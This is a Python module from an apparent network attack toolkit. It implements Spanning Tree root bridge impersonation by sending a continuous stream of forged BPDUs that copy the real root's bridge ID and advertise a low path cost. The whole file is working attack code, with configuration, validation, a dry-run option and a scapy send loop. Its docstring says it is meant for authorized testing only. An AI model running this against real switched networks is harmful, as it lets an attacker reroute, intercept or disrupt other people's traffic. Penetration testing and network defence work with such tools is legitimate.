"""Root bridge impersonation: send BPDUs with a copy of the real root's bridge ID.

Switches identify the root by its bridge ID, the priority and MAC pair in the root
identifier of a BPDU. A device that copies the real root's ID appears to be the same
root, so the identity looks unchanged in most outputs. The root path cost and the
sending bridge ID then decide which port of the switch leads to the root. A device
that advertises a lower cost, or the same cost from a lower bridge ID, can take that
role on its own port.

This module sends a refreshed stream of BPDUs with the target's root ID, from this
interface's bridge ID. It refuses a root MAC equal to this interface's MAC, because
that would be a takeover (see root_bridge_takeover) and not an impersonation.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import sendp

from macabre.attacks.bpdu_spoofing import (
    DEFAULT_PORT_ID,
    HELLO_TIME,
    MAX_PATH_COST,
    MAX_PORT_ID,
    build_bpdu_frame,
    validate_priority,
)
from macabre.attacks.common import Runner, normalize_unicast_mac, read_interface_mac, run_command

HELLO_SECONDS = HELLO_TIME / 256


@dataclass(frozen=True)
class RootBridgeImpersonationConfig:
    iface: str                          # attacker interface, on the switch port under test
    root_priority: int                  # priority of the real root, copied from its BPDUs
    root_mac: str                       # MAC of the real root, copied from its BPDUs (required)
    root_path_cost: int = 0             # cost advertised to the root (lower wins the root port)
    bridge_priority: int = 0            # priority of this bridge's own ID (lower wins ties)
    port_id: int = DEFAULT_PORT_ID      # port identifier carried in the BPDU
    count: int = 0                      # BPDUs to send; 0 = keep sending until stopped
    interval: float = HELLO_SECONDS     # refresh interval; 2 s is the standard hello time
    dry_run: bool = False               # build BPDUs but do not send them

    def __post_init__(self) -> None:
        validate_priority(self.root_priority, "Root priority")
        validate_priority(self.bridge_priority, "Bridge priority")
        if not self.root_mac:
            raise ValueError("Root MAC is required: copy it from the real root's BPDUs.")
        normalize_unicast_mac(self.root_mac)
        if not 0 <= self.root_path_cost <= MAX_PATH_COST:
            raise ValueError("Root path cost must fit in 32 bits.")
        if not 0 <= self.port_id <= MAX_PORT_ID:
            raise ValueError("Port ID must fit in 16 bits.")
        if self.count < 0:
            raise ValueError("Count cannot be negative.")
        if self.interval <= 0:
            raise ValueError("Interval must be positive, or the impersonated root expires.")


@dataclass
class RootBridgeImpersonationStats:
    sender_mac: str = ""
    root_id: str = ""
    frames: int = 0
    status: str = ""


def run_root_bridge_impersonation(
    config: RootBridgeImpersonationConfig,
    stop_event: threading.Event,
    on_progress: Callable[[RootBridgeImpersonationStats], None],
    run: Runner | None = None,
    send: Callable[..., Any] | None = None,
) -> RootBridgeImpersonationStats:
    """Send BPDUs that carry the target's root ID until `count` or `stop_event`."""
    run = run or run_command
    send = send or sendp
    root_mac = normalize_unicast_mac(config.root_mac)

    if config.dry_run:
        stats = RootBridgeImpersonationStats(
            status=(
                f"Dry run: would send BPDUs with root {config.root_priority:04x}.{root_mac} "
                f"every {config.interval:g} s. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    sender_mac = read_interface_mac(config.iface, run)
    if sender_mac == root_mac:
        raise RuntimeError(
            "The root MAC is this interface's MAC. That is a root takeover, not an impersonation."
        )
    stats = RootBridgeImpersonationStats(
        sender_mac=sender_mac,
        root_id=f"{config.root_priority:04x}.{root_mac}",
    )
    while not stop_event.is_set() and (config.count == 0 or stats.frames < config.count):
        frame = build_bpdu_frame(
            sender_mac,
            root_priority=config.root_priority,
            root_mac=root_mac,
            root_path_cost=config.root_path_cost,
            bridge_priority=config.bridge_priority,
            port_id=config.port_id,
        )
        send(frame, iface=config.iface, verbose=False)
        stats.frames += 1
        on_progress(replace(stats))
        stop_event.wait(config.interval)
    return stats
